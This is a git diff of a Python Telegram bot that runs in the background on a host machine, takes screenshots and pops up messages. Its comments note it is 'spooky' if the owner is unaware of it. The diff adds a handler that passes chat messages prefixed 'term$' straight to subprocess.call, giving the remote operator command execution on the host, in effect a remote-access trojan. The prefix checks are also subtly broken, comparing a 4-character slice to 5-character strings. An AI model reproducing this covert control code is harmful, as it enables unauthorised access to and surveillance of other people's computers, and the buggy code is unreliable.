@@ -365,14 +365,22 @@ else:
 
     #Function definition of message. This is not a command. Any message typed to the bot that is not a command gets displayed to the host system's screen(if there is one present)
     #bit of a spooky function if the host system's owner does not know about the program running in the background.
-    async def show_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    async def message_handle(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         try:
             _message=update.message.text
-            messagebox.showinfo("Messenger from Alexandria",_message)
-            
+            if _message[0:4]== "term$":
+                subprocess.call(_message[4:])
+                logins.info("TERMINAL MODE","TERMINAL CALL: "+_message[5:])
+            elif _message[0:4]=="shw$":
+                
+                messagebox.showinfo("Messenger from Alexandria",_message[5:])
+                logins.info("FUNC SHOW_MESSAGE","SHOW_MESSAGE INTIATED")
+            else:
+                print("no message to show")
+
             #toaster=ToastNotifier()                  deprecated
             #toaster.show_toast("Windows",_message)  
-            logins.info("FUNC SHOW_MESSAGE","SHOW_MESSAGE INTIATED")
+            
         except:
             logins.warning("FUNC SHOW_MESSAGE","FUNCTION NON RESPONSIVE")
 
@@ -425,12 +433,6 @@ else:
 
 
 
-    """developmental command line mode function. Do not use on live system"""        
-    async def flagm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-            message=update.effective_message.text
-            ttmsg=message.replace("/command","")
-            print (ttmsg)
-
 
     #developmental function still in beta phase.
     """This function is still in development. Use with caution."""
@@ -444,7 +446,7 @@ else:
 
             mySocket = socket( AF_INET, SOCK_DGRAM )
 
-            link_message = "link_shutdown"
+            link_message = "lndn"
 
             mySocket.sendto(link_message.encode('utf-8'),(SERVER_IP,PORT_NUMBER))
 
@@ -502,8 +504,8 @@ else:
         application.add_handler(CommandHandler("sc",image_grab)) #type /sc
         application.add_handler(CommandHandler("getlogfile",get_log_file))#type /getlogfile
         application.add_handler(CommandHandler("clearlogfile",clear_log_file)) #type /clearlogfile
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, show_message))
-        application.add_handler(CommandHandler("flagm",flagm))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handle)) #type any message with proper calls
+
 
         # Run the bot until the user presses Ctrl-C
         try:
